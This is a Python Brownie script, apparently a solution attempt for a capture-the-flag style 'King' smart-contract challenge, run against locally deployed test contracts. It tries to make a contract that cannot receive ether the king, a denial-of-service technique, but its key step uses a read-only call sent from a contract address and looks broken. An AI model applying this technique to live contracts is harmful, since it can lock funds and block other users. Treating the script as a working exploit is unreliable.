from brownie import King, ForceNew, accounts, web3



# king a contract where there is no transfer/receive (contract cannot receive eth it sent)
def main():
  account_one, account_two = accounts[0], accounts[2]
  
  king_contract = King.deploy({
    'from': account_one,
    'value': 1000,
    'gas_price': 500000
  })

  print(f"current contract-balance: {king_contract.balance()}")
  current_king = king_contract._king.call({'from': account_one, 'gas_price': 500000})
  print(f'current-king: {current_king}')

  account_two.transfer(king_contract.address, 1002, gas_price=50000)

  current_king = king_contract._king.call({'from': account_one, 'gas_price': 500000})
  print(f'current-king: {current_king} / account-two: {account_two}')


  force_contract = ForceNew.deploy({
    'from': account_one,
    'gas_price': 500000
  })

  force_contract.transferKing.call(force_contract.address, king_contract.address, {
    'from': force_contract.address,
    'value': 1005,
    'gas_price': 500000
  })

  # force_contract.address.to(king_contract.address, 1002, gas_price=50000)

  # force_contract.transfer(king_contract.address, 1002, gas_price=50000)

# transfer money to force-contract
# force-contract becomes king in king-contract  







